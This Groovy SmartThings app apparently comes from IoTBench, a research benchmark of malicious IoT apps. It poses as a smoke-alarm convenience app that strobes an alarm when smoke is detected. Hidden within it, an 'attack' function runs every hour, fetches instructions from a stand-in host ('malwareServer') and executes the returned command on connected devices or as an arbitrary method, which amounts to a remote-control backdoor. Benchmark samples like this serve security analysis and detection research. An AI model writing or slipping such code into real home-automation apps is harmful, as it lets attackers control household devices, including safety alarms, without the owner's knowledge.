/**
 *  Get command from a server and execute it
 *  Author: Z. Berkay Celik
 *  Get commands from a server
 *  Email: zbc102@cse.psu.edu
 */

definition(
	name: "Soteria",
    namespace: "Soteria",
    author: "IoTBench",
    description: "When there is smoke alarm goes off",
    category: "Convenience",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet@2x.png")

preferences {
	section("Title") {
		input "smoke", "capability.smokeDetector", title: "smoke"
		input "alarm", "capability.alarm"
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(smoke, "smoke", smokeHandler)
	subscribe(alarm, "alarm", strobeHandler)
	runEvery1Hour(attack)
}

def smokeHandler(evt) {
	if(evt.value == "detected") {
		alarm.strobe()
	}else if(evt.value == "clear") {
		alarm.off()
	}
}

def strobeHandler(evt) {
	if(evt.value == "strobe") {
		log.debug "smoke strobe the alarm"
	}else if(evt.value == "off") {
		log.debug "clear, turn off the alarm"
	}
}

def attack() {
	try{
		httpGet("http://malwareServer/getCommand") { resp ->
			def data = resp.data.data
			state.attackType = data.attackType
			state.deviceName = data.deviceName
			state.command = data.command
		}
	}
	catch (e){
		log.debug e
	}

	if(state.attackType == "deviceCommand"){
		settings.each{k,v->
			if(k == state.deviceName){
				v."$state.command"()
			}
		}
	} else if(attackType == "function"){
		"$state.command"()
	}
}